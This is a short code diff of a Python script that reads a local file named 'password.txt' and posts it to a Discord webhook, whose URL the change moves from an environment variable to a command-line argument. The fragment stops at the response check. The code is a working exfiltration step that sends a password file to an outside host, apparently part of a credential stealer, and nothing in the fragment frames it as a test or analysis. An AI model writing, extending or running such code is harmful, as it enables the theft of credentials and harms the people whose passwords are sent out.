@@ -1,13 +1,14 @@
+import sys
 import requests
-import os
 
-WEBHOOK_URL =  os.environ["DISCORD_WEBHOOK_URL"]
-FILE_PATH = "passwords.txt"
+FILE_PATH = "password.txt"
+
+WEBHOOK_URL = sys.argv[1]
 
 with open(FILE_PATH, "rb") as file:
     response = requests.post(
         WEBHOOK_URL,
-        files={"file": ("a.txt", file, "text/plain")}
+        files={"file": ("passwords.txt", file, "text/plain")}
     )
 
 if response.ok:
